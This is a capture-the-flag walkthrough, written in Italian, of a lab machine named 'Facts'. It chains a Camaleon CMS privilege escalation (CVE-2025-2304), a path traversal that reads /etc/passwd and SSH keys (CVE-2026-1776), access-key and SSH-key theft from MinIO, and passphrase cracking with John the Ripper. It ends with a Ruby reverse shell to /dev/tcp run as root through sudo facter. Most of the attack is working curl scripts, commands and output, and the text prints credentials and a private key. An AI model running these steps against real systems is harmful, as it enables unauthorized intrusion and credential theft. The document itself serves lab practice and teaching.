# Facts

IP vittima: 10.10.15.219 
IP attaccante: 10.129.244.96
## Recon
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.244.96 -oG porte`
``` bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-10 20:32 CEST
Initiating SYN Stealth Scan at 20:32
Scanning 10.129.244.96 [65535 ports]
Discovered open port 22/tcp on 10.129.244.96
Discovered open port 80/tcp on 10.129.244.96
Discovered open port 54321/tcp on 10.129.244.96
Completed SYN Stealth Scan at 20:32, 11.66s elapsed (65535 total ports)
Nmap scan report for 10.129.244.96
Host is up, received user-set (0.034s latency).
Scanned at 2026-04-10 20:32:03 CEST for 11s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
54321/tcp open  unknown syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.76 seconds
           Raw packets sent: 67662 (2.977MB) | Rcvd: 65645 (2.626MB)
```
Porte aperte: 22 (ssh), 80 (http), 54321 (n.d.)

`sudo nmap -sC -sV -p $(mports porte) 10.129.244.96 -oN servizi`
``` bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-10 20:35 CEST
Nmap scan report for 10.129.244.96
Host is up (0.022s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  http    Golang net/http server
|_http-server-header: MinIO
|_http-title: Did not follow redirect to http://10.129.244.96:9001
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18A512AF42F04E89
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 10 Apr 2026 18:36:12 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>18A512AF42F04E89</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18A512ABB0278F0E
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 10 Apr 2026 18:35:56 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>18A512ABB0278F0E</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Fri, 10 Apr 2026 18:35:56 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```
Porte: 
- 22 (OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0))
- 80 (http    nginx 1.26.3 (Ubuntu))
- 54321 (http    Golang net/http server)
Aulla porta 54321 è attivo un servizio **MinIO** 

> [!NOTE]
> ### MinIO
> MinIO è un **object storage** compatibile con **Amazon S3** (**Amazon Simple Storage Service**, è un servizio cloud di **object storage** offerto da AWS, cioè Amazon Web Services).
> In pratica è un software che serve per **salvare e gestire file come oggetti**, invece di organizzarli in cartelle e sottocartelle come in un normale filesystem.
> #### In modo semplice
> Con MinIO puoi conservare file come: immagini, video, backup, log, documenti, file generati da applicazioni, dataset.
> Ogni file viene salvato dentro un **bucket**, che è simile a un contenitore.
> #### Come funziona
> MinIO espone API compatibili con **S3**, quindi molti programmi che sanno parlare con Amazon S3 possono lavorare anche con MinIO.

`gobuster dir -k -u http://facts.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt`
``` bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://facts.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git-rewrite         (Status: 200) [Size: 11134]
/.cvsignore           (Status: 200) [Size: 11128]
...
/_framework/blazor.webassembly.js (Status: 422) [Size: 8380]
/admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/admin.cgi            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/admin.php            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/admin.pl             (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/ajax                 (Status: 200) [Size: 0]
...
```
[[gobuster]]trova una directori **admin**
## Porta 80
![[Pasted image 20260410212447.png]]
L'analisi del sito non porta a nulla.
#### http://facts.htb/admin/login
![[Pasted image 20260410212740.png]]
La directory trovata con [[gobuster]]è un login. Creiamo un account e loggiamo con le credenziali create (user: hacker - password: hacker).
![[Pasted image 20260410213256.png]]
Il servizio è **Camaleon CMS** versione **2.9.0** ed è soggetta all'exploit **CVE-2025-2304**
## CVE-2025-2304
Il **CVE-2025-2304** è una vulnerabilità di **privilege escalation** in **Camaleon CMS** (versioni **prima della 2.9.1**). È causata da un problema di **mass assignment**: il server accetta parametri che non dovrebbe accettare. Questo può permettere a un utente autenticato con pochi permessi di **assegnarsi privilegi da amministratore**. La gravità riportata è **critica**. La mitigazione è **aggiornare alla 2.9.1 o successiva** e controllare eventuali modifiche sospette ai ruoli utente.

Questo l'exploit: https://github.com/whiteov3rflow/CVE-2025-2304-POC

> [!NOTE]
> ## Descrizione
> 
> La vulnerabilità di **mass assignment** nel metodo `updated_ajax` consente agli utenti autenticati di **escalare i privilegi ad amministratore** iniettando il parametro `password[role]=admin` durante il cambio password.
> ## Uso
> ``` shell
> python3 exploit.py <url> <username> <password>
> ```
> ## Esempio
> ```shell
> python3 exploit.py http://target.com attacker attacker
> ```
> 

Dopo aver lanciato l'exploit con `python3 exploit.py http://facts.htb hacker hacker` occorre sloggare e riloggare diventando amministratore.
## Aws s3
Nella sezione Settings/General Site/Filesystem Settings troviamo le credenziali Aws s3 access key e secret key che possiamo usare per analizzare il servizio
![[Pasted image 20260410220133.png]]
Per analizzare il servizio usiamo [[mc]]che possiamo scaricare da qui:
`wget https://dl.min.io/client/mc/release/linux-amd64/mc`
Poi diamo i permessi con `chmod +x mc`
Eseguiamo questi comandi per esplorare il servizio:
`./mc alias set factsminio http://10.129.244.96:54321 AKIA573B3E4EED8AD50F M7UYce7zrtgzavSqSLtNxGjE3HvmDK9cgfIMEsEV --api S3v4`
```
./mc ls factsminio/
[2025-09-11 14:06:52 CEST]     0B internal/
[2025-09-11 14:06:52 CEST]     0B randomfacts/
```
```
./mc ls factsminio/internal/ ottengo:
[2026-01-08 19:45:13 CET]   220B STANDARD .bash_logout
[2026-01-08 19:45:13 CET] 3.8KiB STANDARD .bashrc
[2026-01-08 19:47:17 CET]    20B STANDARD .lesshst
[2026-01-08 19:47:17 CET]   807B STANDARD .profile
[2026-04-10 22:18:16 CEST]     0B .bundle/
[2026-04-10 22:18:16 CEST]     0B .cache/
[2026-04-10 22:18:16 CEST]     0B .ssh
```
```
./mc ls factsminio/internal/.ssh/
[2026-04-10 20:30:28 CEST]    82B STANDARD authorized_keys
[2026-04-10 20:30:28 CEST]   464B STANDARD id_ed25519
```
Troviamo una chiave privata ssh che scarichiamo:
```
./mc cp factsminio/internal/.ssh/id_ed25519 .
chmod 600 id_ed25519
```
Qui non riusciamo a trovare altro.
## CVE-2026-1776
https://nvd.nist.gov/vuln/detail/cve-2026-1776
Il **CVE-2026-1776** è una vulnerabilità di **path traversal** in **Camaleon CMS**. Colpisce le versioni **dalla 2.4.5.0 alla 2.9.1**. Il problema riguarda l’implementazione dell’**uploader AWS S3**, in particolare la funzionalità `download_private_file`, quando l’applicazione usa il backend `CamaleonCmsAwsUploader`.
In pratica, un utente autenticato può manipolare il percorso del file richiesto e far sì che l’applicazione **legga file arbitrari dal filesystem del server web** invece dei soli file previsti. Quindi non si parla di esecuzione di codice, ma di **lettura non autorizzata di file**.
### Sfruttamento:
Per ottenere i cookie della sessione autenticata, possiamo effettuare il login con `curl` in modo più robusto, assicurandoci di inviare tutti i campi necessari e di gestire correttamente il token CSRF. Ecco una procedura passo passo:
``` bash
# Estrae il token CSRF dalla pagina di login e salva i cookie iniziali  
CSRF_TOKEN=$(curl -c cookies_init.txt -s http://facts.htb/admin/login \  
| grep -oP 'name="authenticity_token" value="\K[^"]+' \  
| head -1)  
  
# Effettua il login usando il token CSRF e salva i cookie di sessione  
curl -s -X POST http://facts.htb/admin/login \  
-b cookies_init.txt -c cookies.txt \  
-d "authenticity_token=$CSRF_TOKEN&user[username]=hacker&user[password]=hacker" > /dev/null  
  
# Estrae il token CSRF dalla dashboard autenticata  
CSRF_DASH=$(curl -s http://facts.htb/admin/dashboard -b cookies.txt \  
| grep -oP 'name="csrf-token" content="\K[^"]+')  
  
# Invia la richiesta finale usando sessione autenticata e token CSRF  
curl -s "http://facts.htb/admin/media/download_private_file?file=../../../../etc/passwd" \  
-H "X-CSRF-Token: $CSRF_DASH" \  
-b cookies.txt
```

Otteniamo il file **passwd**
``` bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```
Troviamo gli utenti **trivia** e **william**
Proviamo a cercare delle chiavi SSH per gli utenti trovati con questo script:
``` bash
for user in trivia william root; do
  for key in id_rsa id_ed25519; do
    echo "--- /home/$user/.ssh/$key ---"
    curl -X GET "http://facts.htb/admin/media/download_private_file?file=../../../../home/$user/.ssh/$key" \
      -H "X-CSRF-Token: $CSRF" -b cookies.txt
    echo
  done
done
```
Troviamo un file html che contiene la chiave SSH privata dell'utente trivia
```
--- /home/trivia/.ssh/id_ed25519 ---
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABA+YXgcPS
yxvJHso6UyeR+EAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAINiZ5Fwt62w3c3Rp
i+5nWk4myj2erze0Va6OKxlFzesRAAAAoEPtB672PiBtRrwLPZBdipEY17QddAOQjufYx8
0d3APQvUZ5KvB4YWVPRHOAfV5TQFUb57SAZr2hL5hpOug0xRUzhE0uKqchXKXdgXrFDbG+
X3BWvN+2zpJyVB36f7KZ5mQSgTIB+E2oo9P+oV55d4Ah8m9BpOIlP8VitbMCrKlorO2q5D
sFiZsPClgz8n0587rWP80C+fk8reMM3jvZITk=
-----END OPENSSH PRIVATE KEY-----
```
E' la stessa chiave che avevamo trovato sfruttando **mc**.
## SSH
Salviamo la chiave, diamogli i permessi e proviamo ad utilizzarla con l-'utente **trivia** per loggarci a ssh:
``` bash
cat > id_ed25519_trivia << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABA+YXgcPS
yxvJHso6UyeR+EAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAINiZ5Fwt62w3c3Rp
i+5nWk4myj2erze0Va6OKxlFzesRAAAAoEPtB672PiBtRrwLPZBdipEY17QddAOQjufYx8
0d3APQvUZ5KvB4YWVPRHOAfV5TQFUb57SAZr2hL5hpOug0xRUzhE0uKqchXKXdgXrFDbG+
X3BWvN+2zpJyVB36f7KZ5mQSgTIB+E2oo9P+oV55d4Ah8m9BpOIlP8VitbMCrKlorO2q5D
sFiZsPClgz8n0587rWP80C+fk8reMM3jvZITk=
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 id_ed25519_trivia

# Prova a connetterti
ssh -i id_ed25519_trivia trivia@10.129.16.130
```
La chiave richiede una passphrase che cerchiamo con un attacco bruteforce con [[johntheripper]]:
``` bash
#1 Converti la chiave in un hash utilizzabile da John: Esegui questo comando per estrarre l'hash.
/usr/share/john/ssh2john.py id_ed25519_trivia > hash_trivia.txt

#2 Esegui il cracking con una wordlist: Il passo successivo è lanciare John the Ripper utilizzando una wordlist. La più comune è `rockyou.txt`
john --wordlist=/usr/share/wordlists/rockyou.txt hash_trivia.txt
```
otteniamo la passphrase: **dragonballz**
``` bash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_ed25519_trivia)     
1g 0:00:01:13 DONE (2026-04-10 23:30) 0.01352g/s 43.28p/s 43.28c/s 43.28C/s billy1..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Ora possiamo accedere a ssh con l'utente **trivia**:
``` bash
ssh -i id_ed25519_trivia trivia@10.129.244.96
password: dragonballz
```

Troviamo la userflag nella cartella `/home/william`
## Scalata dei privilegi
Con `sudo -l` troviamo:
``` bash
atching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```
L'utente può eseguire **facter** come super user senza password.

> [!NOTE]
> Facter è un comando che **raccoglie e mostra informazioni sul sistema**: sistema operativo, kernel, rete, CPU, memoria, dischi e molti altri “facts”. È usato soprattutto nell’ecosistema **Puppet** per ottenere dati sulla macchina e usarli nella configurazione automatica.
> In pratica serve come una sorta di **inventario rapido del sistema**.
> Il suo compito è scoprire e riportare le caratteristiche di ogni nodo (server) sotto forma di "fatti" (facts), che vengono poi usati come variabili nei manifest di Puppet per determinare come configurare la macchina.
> Tuttavia, puoi usare Facter anche in modo indipendente da Puppet, semplicemente per esplorare e analizzare un sistema dalla riga di comando.
> Oltre ai fatti predefiniti, Facter può essere esteso con **fatti personalizzati (custom facts)**. Si tratta di script, tipicamente scritti in Ruby, che definiscono nuove informazioni da raccogliere.

La presenza di `sudo -l` che elenca `/usr/bin/facter` con `NOPASSWD` significa che l'utente `trivia` può eseguire Facter con i privilegi di root, senza fornire password.
Mettiamoci in ascolto con `nc -lvnp 4444`
Quindi si crea uno script ruby che invia una shell e lo facciamo eseguire da facter come root"
``` bash
# 1. creiamo una cartella in /tmp/
mkdir -p /tmp/facts.d

# 2. inseriamo la reverse shell nel file shell.rb
cat > /tmp/facts.d/shell.rb << 'EOF' 
> system('bash -c "bash -i >& /dev/tcp/10.10.15.219/4444 0>&1"')
> EOF

# 3. lanciamo lo script con facter a i permessi di root con sudo
sudo facter --custom-dir /tmp/facts.d shell
```

Otteniamo la shell sulla porta 4444.
la root flag si trova in `/root`
